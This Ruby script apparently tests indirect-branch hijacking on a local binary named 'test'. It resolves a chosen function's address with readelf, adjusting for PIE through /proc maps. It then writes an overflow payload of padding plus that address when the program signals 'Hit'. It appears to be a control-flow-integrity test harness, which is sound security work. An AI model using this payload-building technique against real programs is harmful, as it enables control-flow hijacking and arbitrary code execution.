#!/usr/bin/env ruby
require 'pty'

@target_funcs=Hash.new
@is_pie=false

def write_exploit(pid)
#  print("Calculating address of function: #{ARGV[0]}\n")
  address=@target_funcs[ARGV[0]]

  if not address
    print("Function: #{ARGV[0]} was not found in the test binary\n")
    exit
  end

  real_address=address.to_i(16)

  if @is_pie
    `cat /proc/#{pid}/maps | grep test | grep "r-xp"`.each_line { |line|
      real_address += line.split("-")[0].to_i(16)
    }
  end

#  print("Calculated address: #{real_address.to_s(16)}\n")

  File.open("exploit", "wb") { |file|
    file.write("A"*8 + [real_address].pack("Q"))
  }
end

if ARGV.length < 1
  print("You have to specify the target of the indirect branch!\n")
  exit
end

# check if binary is PIE
`readelf -h test | grep Type`.each_line { |line|
  @is_pie=true if line.include? "DYN"
}

# collect function addresses
`readelf -s -W test | grep FUNC`.each_line { |line|
  line=line.split(":")[1]

  addr = line.split(" ")[0]
  name = line.split(" ")[-1]

  @target_funcs[name] = addr
}

begin
  PTY.spawn("./test") { |stdout, stdin, pid|
    begin
      stdout.each { |line|
        if line.start_with?("Hit")
          write_exploit(pid)
          stdin.write("\n")
        else
          print(line)
        end
      }
    rescue Errno::EIO
      print("No more I/O :(\n")
    end
  }
rescue PTY::ChildExited
  print("All done!\n")
end